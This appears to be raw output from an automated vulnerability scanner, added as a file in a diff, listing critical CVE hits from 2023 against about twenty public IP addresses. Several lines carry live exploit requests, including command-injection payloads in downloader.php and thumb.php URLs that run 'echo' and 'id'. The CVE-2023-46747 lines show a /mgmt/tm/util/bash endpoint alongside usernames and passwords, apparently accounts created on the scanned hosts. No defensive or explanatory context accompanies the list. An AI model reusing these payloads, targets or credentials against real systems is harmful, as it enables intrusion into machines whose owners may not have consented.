@@ -1,0 +1,133 @@
+[CVE-2023-1698] [http] [critical] http://192.71.211.58/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://192.71.211.58/saas./resttosaasservlet
+[CVE-2023-1698] [http] [critical] http://158.255.208.54/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-23333] [http] [critical] http://192.71.211.58/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://192.71.211.58/ajax/api/user/save
+[CVE-2023-20887] [http] [critical] http://158.255.208.54/saas./resttosaasservlet
+[CVE-2023-25135] [http] [critical] http://158.255.208.54/ajax/api/user/save
+[CVE-2023-23333] [http] [critical] http://158.255.208.54/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-1698] [http] [critical] http://104.248.191.18/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://193.235.146.41/saas./resttosaasservlet
+[CVE-2023-20887] [http] [critical] http://104.248.191.18/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://104.248.191.18/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-1698] [http] [critical] http://193.235.146.41/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-25135] [http] [critical] http://104.248.191.18/ajax/api/user/save
+[CVE-2023-23333] [http] [critical] http://193.235.146.41/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://193.235.146.41/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://170.64.173.41/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://170.64.173.41/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://170.64.173.41/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://170.64.173.41/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://172.105.180.48/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://172.105.180.48/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://172.105.180.48/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://172.105.180.48/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://151.236.15.117/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://151.236.15.117/saas./resttosaasservlet
+[CVE-2023-1698] [http] [critical] http://151.236.30.73/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://151.236.30.73/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://151.236.15.117/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://151.236.15.117/ajax/api/user/save
+[CVE-2023-23333] [http] [critical] http://151.236.30.73/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://151.236.30.73/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://178.79.138.58/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://178.79.138.58/saas./resttosaasservlet
+[CVE-2023-25135] [http] [critical] http://178.79.138.58/ajax/api/user/save
+[CVE-2023-23333] [http] [critical] http://178.79.138.58/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-50917] [http] [critical] http://192.71.211.58/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://192.71.211.58/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://104.248.191.18/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://104.248.191.18/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://158.255.208.54/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-50917] [http] [critical] http://193.235.146.41/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://158.255.208.54/api/setup/validate
+[CVE-2023-38646] [http] [critical] http://193.235.146.41/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://170.64.173.41/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://170.64.173.41/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://172.105.180.48/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-50917] [http] [critical] http://151.236.30.73/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://151.236.30.73/api/setup/validate
+[CVE-2023-38646] [http] [critical] http://172.105.180.48/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://151.236.15.117/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://151.236.15.117/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://178.79.138.58/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://178.79.138.58/api/setup/validate
+[CVE-2023-46747] [http] [critical] http://192.71.211.58/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://192.71.211.58/mgmt/tm/util/bash ["Password:YkV0rSCrd1UW","Username:LZDYi"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://158.255.208.54/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://104.248.191.18/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://104.248.191.18/mgmt/tm/util/bash ["Password:YkV0rSCrd1UW","Username:LZDYi"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://158.255.208.54/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://193.235.146.41/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://193.235.146.41/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://170.64.173.41/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://170.64.173.41/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://172.105.180.48/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://172.105.180.48/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://151.236.30.73/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://151.236.15.117/mgmt/tm/util/bash ["Password:YkV0rSCrd1UW","Username:LZDYi"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://151.236.30.73/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://151.236.15.117/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://178.79.138.58/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://178.79.138.58/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-1698] [http] [critical] http://208.83.238.82/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-1698] [http] [critical] http://216.238.76.111/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://216.238.76.111/saas./resttosaasservlet
+[CVE-2023-20887] [http] [critical] http://208.83.238.82/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://208.83.238.82/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-23333] [http] [critical] http://216.238.76.111/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://216.238.76.111/ajax/api/user/save
+[CVE-2023-25135] [http] [critical] http://208.83.238.82/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://45.76.243.216/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://45.76.243.216/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://45.76.243.216/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-23333] [http] [critical] http://45.32.116.91/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://45.76.243.216/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://45.77.4.152/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://45.77.4.152/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://45.77.4.152/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://45.77.4.152/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://45.91.171.183/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://45.91.171.183/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://45.91.171.183/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://45.91.171.183/ajax/api/user/save
+[CVE-2023-1698] [http] [critical] http://67.219.101.87/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-20887] [http] [critical] http://67.219.101.87/saas./resttosaasservlet
+[CVE-2023-23333] [http] [critical] http://67.219.101.87/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://67.219.101.87/ajax/api/user/save
+[CVE-2023-23333] [http] [critical] http://70.34.209.220/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
+[CVE-2023-25135] [http] [critical] http://70.34.209.220/ajax/api/user/save
+[CVE-2023-20887] [http] [critical] http://70.34.209.220/saas./resttosaasservlet
+[CVE-2023-1698] [http] [critical] http://70.34.209.220/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php
+[CVE-2023-50917] [http] [critical] http://216.238.76.111/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://216.238.76.111/api/setup/validate
+[CVE-2023-38646] [http] [critical] http://208.83.238.82/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://208.83.238.82/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-50917] [http] [critical] http://45.32.116.91/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://45.32.116.91/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://45.76.243.216/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://45.76.243.216/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://45.77.4.152/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://45.77.4.152/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://45.91.171.183/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://45.91.171.183/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://67.219.101.87/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://67.219.101.87/api/setup/validate
+[CVE-2023-50917] [http] [critical] http://70.34.209.220/modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B
+[CVE-2023-38646] [http] [critical] http://70.34.209.220/api/setup/validate
+[CVE-2023-46747] [http] [critical] http://216.238.76.111/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://216.238.76.111/mgmt/tm/util/bash ["Password:KDIPD7TDHP6lgh","Username:LZDYi"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://208.83.238.82/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://208.83.238.82/mgmt/tm/util/bash ["Password:YkV0rSCrd1UW","Username:LZDYi"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://45.32.116.91/mgmt/tm/util/bash ["Password:YkV0rSCrd1UW","Username:LZDYi"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://45.32.116.91/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://45.76.243.216/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://45.76.243.216/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://45.77.4.152/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://45.77.4.152/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://45.91.171.183/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://45.91.171.183/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://67.219.101.87/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
+[CVE-2023-46747] [http] [critical] http://67.219.101.87/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://70.34.209.220/mgmt/tm/util/bash ["Username:LZDYi","Password:KDIPD7TDHP6lgh"] [pass="KDIPD7TDHP6lgh"]
+[CVE-2023-46747] [http] [critical] http://70.34.209.220/mgmt/tm/util/bash ["Username:LZDYi","Password:YkV0rSCrd1UW"] [pass="YkV0rSCrd1UW"]
